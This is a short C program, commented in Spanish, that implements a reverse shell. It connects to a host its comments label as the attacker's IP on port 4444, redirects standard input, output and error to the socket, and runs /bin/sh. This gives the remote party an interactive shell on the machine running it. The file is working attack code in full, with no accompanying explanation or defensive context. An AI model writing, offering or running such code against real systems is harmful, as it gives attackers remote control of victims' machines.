#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

int main() {
    int sockfd;
    struct sockaddr_in addr;
    
    // Crear el socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    
    if (sockfd < 0) {
        perror("Socket error");
        return 1;
    }
    
    addr.sin_family = AF_INET;
    addr.sin_port = htons(4444);  // Puerto del atacante
    addr.sin_addr.s_addr = inet_addr("192.168.1.100"); // Dirección IP del atacante

    // Conectar al atacante
    if (connect(sockfd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("Connect error");
        return 1;
    }

    // Redirigir la entrada/salida estándar a la conexión
    dup2(sockfd, 0);  // Redirige stdin
    dup2(sockfd, 1);  // Redirige stdout
    dup2(sockfd, 2);  // Redirige stderr
    
    // Ejecutar la shell
    execve("/bin/sh", NULL, NULL);
    
    return 0;
}
